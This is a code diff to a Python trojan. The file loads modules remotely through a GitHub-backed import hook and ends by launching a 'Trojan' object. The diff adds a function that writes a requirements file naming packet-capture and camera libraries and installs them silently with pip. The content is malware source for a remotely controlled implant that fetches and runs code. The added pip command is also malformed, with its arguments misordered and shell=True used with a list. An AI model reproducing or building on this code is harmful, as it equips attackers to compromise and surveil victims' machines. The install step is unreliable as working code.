@@ -1,4 +1,6 @@
 import base64
+import shlex
+
 import github3
 import importlib
 import json
@@ -6,8 +8,7 @@ import random
 import sys
 import threading
 import time
-import modules.dirlister
-import modules.environment
+import subprocess
 
 
 from datetime import datetime
@@ -95,8 +96,33 @@ class GitImporter:
         sys.modules[spec.name] = new_module
         return new_module
 
+def install_dependencies():
+    dependencies = """certifi==2022.12.7
+cffi==1.15.1
+charset-normalizer==3.1.0
+cryptography==40.0.1
+github3.py==3.2.0
+idna==3.4
+kamene==0.32
+numpy==1.24.2
+opencv-python==4.7.0.72
+pycparser==2.21
+PyJWT==2.6.0
+python-dateutil==2.8.2
+requests==2.28.2
+scapy==2.5.0
+six==1.16.0
+uritemplate==4.1.1
+urllib3==1.26.15"""
+    with open("requirements.txt", 'w') as f:
+        f.writelines(dependencies)
+    cmd = "pip -r install requirements.txt"
+    subprocess.check_output(
+        shlex.split(cmd), shell=True
+    )
 
 if __name__ == "__main__":
     sys.meta_path.append(GitImporter())
+    install_dependencies()
     trojan = Trojan("abc")
     trojan.run()
